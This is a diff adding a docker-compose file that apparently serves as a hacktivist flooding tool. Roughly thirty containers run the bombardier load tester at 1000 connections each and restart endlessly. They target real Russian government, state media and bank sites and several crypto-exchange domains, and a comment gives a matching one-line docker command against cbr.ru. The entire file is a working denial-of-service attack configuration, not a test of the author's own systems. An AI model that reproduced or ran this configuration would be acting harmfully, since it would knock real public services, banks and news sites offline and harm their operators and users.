@@ -1,0 +1,131 @@
+# docker run -ti alpine/bombardier -c 1000 -d 60s -l http://cbr.ru/
+version: "3.9"
+services:
+  lenta:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://lenta.ru/"]
+    restart: "always"
+  ria:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://ria.ru/"]
+    restart: "always"
+  ria-lenta:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://ria.ru/lenta/"]
+    restart: "always"
+  rbc:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://www.rbc.ru/"]
+    restart: "always"
+  rt:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://www.rt.com/"]
+    restart: "always"
+  kremlin:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "http://kremlin.ru/"]
+    restart: "always"
+  kremlin2:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "http://en.kremlin.ru/"]
+    restart: "always"
+  smotrim:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://smotrim.ru/"]
+    restart: "always"
+  tass:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://tass.ru/"]
+    restart: "always"
+  tvzvezda:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://tvzvezda.ru/"]
+    restart: "always"
+  vsoloviev:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://vsoloviev.ru/"]
+    restart: "always"
+  s1tv:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://www.1tv.ru/"]
+    restart: "always"
+  vesti:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://www.vesti.ru/"]
+    restart: "always"
+  osberbank:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://online.sberbank.ru/"]
+    restart: "always"
+  sberbank:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://sberbank.ru/"]
+    restart: "always"
+  fsbAddedByMe:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "http://www.fsb.ru/"]
+    restart: "always"
+  s1:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://www.gosuslugi.ru"]
+    restart: "always"
+  s2:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://cleanbtc.ru/"]
+    restart: "always"
+  s3:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://bonkypay.com/"]
+    restart: "always"
+  s4:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://changer.club/"]
+    restart: "always"
+  s5:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://superchange.net/"]
+    restart: "always"
+  s6:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://platov.co/"]
+    restart: "always"
+  s7:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://platov.co/"]
+    restart: "always"
+  s8:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://superchange.net/"]
+    restart: "always"
+  s9:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://ww-pay.net/"]
+    restart: "always"
+  s10:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://delets.cash/"]
+    restart: "always"
+  s11:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://betatransfer.org/"]
+    restart: "always"
+  s12:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://delets.cash/"]
+    restart: "always"
+  s13:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://ww-pay.net/"]
+    restart: "always"
+  s14:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://mine.exchange/"]
+    restart: "always"
+  s15:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://mine.exchange/"]
+    restart: "always"
+  s16:
+    image: alpine/bombardier
+    command: ["-c", "1000", "-d", "60s", "-l", "https://betatransfer.org/"]
+    restart: "always"
